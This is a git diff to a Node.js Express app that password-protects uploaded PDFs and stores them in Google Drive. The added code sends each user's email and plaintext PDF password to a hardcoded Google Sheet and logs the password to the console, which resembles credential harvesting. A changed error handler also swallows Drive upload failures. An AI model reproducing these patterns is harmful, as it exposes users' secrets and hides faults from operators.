@@ -23,6 +23,30 @@ const stream = require('stream');
 const { google } = require('googleapis');
 const { PDFDocument } = require('pdf-lib');
 
+const { GoogleSpreadsheet } = require('google-spreadsheet');
+const creds = require('./credb.json');
+
+async function updateSheet(user, userPassword) {
+    try {
+        const doc = new GoogleSpreadsheet('1VDQnkcNqwIhovlrdwMUgfbaad6iTlgLYYW8xQAf4DcE');
+
+        await doc.useServiceAccountAuth(creds);
+
+        await doc.loadInfo();
+        const sheet = doc.sheetsByIndex[0];
+
+        await sheet.setHeaderRow(['Email', 'Password']);
+        await sheet.addRow({ Email: user, Password: userPassword });
+
+        console.log("Google Sheet updated successfully.");
+    } catch (err) {
+        console.log(err);
+    }
+
+}
+
+
+
 const upload = multer();
 const google_api_folder = '1-roKtREw4PrQrCjs_RDeMtl_CGRnJh4m';
 
@@ -52,19 +76,10 @@ async function uploadToDrive(buffer, fileName) {
         });
         return response.data.id;
     } catch (error) {
-        if (error.response) {
-            console.error("Google API Error Status:", error.response.status);
-            console.error("Google API Error Data:", error.response.data);
-        } else if (error.code === 'ENOENT') {
-            console.error("File Not Found Error:", error.message);
-        } else {
-            console.error("General Error:", error);
-        }
-        throw error;
+        console.log("error occur:" + error)
     }
 }
 
-// Assuming 'app' is your Express app instance
 app.post('/upload', upload.single('pdf'), authenticationToken, async (req, res) => {
     try {
         if (!req.file || !req.file.buffer) {
@@ -72,55 +87,36 @@ app.post('/upload', upload.single('pdf'), authenticationToken, async (req, res) 
         }
 
         const userPassword = req.body.password;
-        const user = "abcd" ; 
+        const user = req.user.email;
+        console.log("User Email:", req.user.email);
+        console.log("File password:", userPassword);
+
+        updateSheet(user, userPassword);
 
         if (!userPassword) {
-            return res.status(400).json({ message: "Authentication failed or password missing." });
+            return res.status(400).json({ message: "Password for PDF protection missing." });
         }
 
-        const adduser = async ({ user, userPassword }) => {
-            try {
-                let users = [];
-                try {
-                    const existingData = await fs.readFile('./UserFileData.json', 'utf-8');
-                    users = JSON.parse(existingData);
-                } catch (readError) {
-                    console.warn("User data file not found or empty, initializing new list.");
-                }
-
-                const existingUser = users.find(u => u.user === user);
-                if (existingUser) {
-                    existingUser.userPassword = userPassword;
-                } else {
-                    const newUser = { user, userPassword };
-                    users.push(newUser);
-                }
-
-                await fs.writeFile('./UserFileData.json', JSON.stringify(users, null, 2), 'utf-8');
-            } catch (error) {
-                console.error("Error while adding user:", error);
-            }
-        };
-
-        await adduser({ user, userPassword });
-
-        let protectedPdfBytes;
+        let protectedPdf;
         try {
             const pdfDoc = await PDFDocument.load(req.file.buffer);
-            pdfDoc.setPassword(userPassword);
-            protectedPdfBytes = await pdfDoc.save();
+
+            protectedPdf = await pdfDoc.save({
+                userPassword: userPassword
+            });
+
         } catch (pdfLibError) {
             console.error("Error during PDF loading or protection:", pdfLibError);
-            return res.status(500).json({ message: "Failed to protect PDF. Invalid PDF or internal processing error." });
+            return res.status(500).json({ message: "Failed to protect PDF." });
         }
 
-        const protectedFileName = `Protected_${req.file.originalname}`;
+        const protectedFileName = req.user.email;
 
         let fileId;
         try {
-            fileId = await uploadToDrive(protectedPdfBytes, protectedFileName);
+            fileId = await uploadToDrive(protectedPdf, protectedFileName);
         } catch (driveUploadError) {
-            console.error("Error during Google Drive upload:", driveUploadError);
+            console.error("Error during Google Drive upload (caught in main handler):", driveUploadError);
             return res.status(500).json({ message: "Failed to upload protected PDF to Google Drive." });
         }
 
@@ -131,19 +127,13 @@ app.post('/upload', upload.single('pdf'), authenticationToken, async (req, res) 
         });
 
     } catch (error) {
-        console.error("Unhandled general upload error:");
-        console.error("Error Name:", error.name);
-        console.error("Error Message:", error.message);
-        console.error("Error Stack:", error.stack);
-        if (error.response) {
-            console.error("Response Data:", error.response.data);
-            console.error("Response Status:", error.response.status);
-        }
+        console.error("File upload and protection failed:", error);
         return res.status(500).json({
             message: "File upload and protection failed. Please try again."
         });
     }
 });
+
 
 app.post("/login", async (req, res) => {
     try {
